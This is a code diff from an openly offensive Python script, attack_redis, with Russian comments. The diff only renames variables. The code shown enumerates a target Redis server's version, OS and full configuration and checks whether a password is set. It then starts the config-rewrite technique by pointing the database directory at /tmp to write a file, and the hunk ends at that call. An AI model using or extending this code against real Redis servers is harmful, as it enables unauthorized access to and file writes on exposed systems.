@@ -20,14 +20,20 @@ def attack_redis(host, port):
         
         # Информация о сервере
         info = r.info('server')
-        print(f"[+] Redis версия: {info.get('redis_version', 'unknown')}")
-        print(f"[+] ОС: {info.get('os', 'unknown')}")
+        redis_version = info.get('redis_version', 'unknown')
+        os_info = info.get('os', 'unknown')
+        print(f"[+] Redis версия: {redis_version}")
+        print(f"[+] ОС: {os_info}")
         
         # Конфигурация
         cfg = r.config_get('*')
-        print(f"[+] Текущая директория: {cfg.get('dir', 'N/A')}")
-        print(f"[+] Имя файла БД: {cfg.get('dbfilename', 'N/A')}")
-        print(f"[+] Пароль: {'НЕТ' if not cfg.get('requirepass', '') else 'УСТАНОВЛЕН'}")
+        dir_path = cfg.get('dir', 'N/A')
+        dbfilename = cfg.get('dbfilename', 'N/A')
+        requirepass = cfg.get('requirepass', '')
+        password_status = 'НЕТ' if not requirepass else 'УСТАНОВЛЕН'
+        print(f"[+] Текущая директория: {dir_path}")
+        print(f"[+] Имя файла БД: {dbfilename}")
+        print(f"[+] Пароль: {password_status}")
         
         # Запись тестового файла в /tmp
         r.config_set('dir', '/tmp')
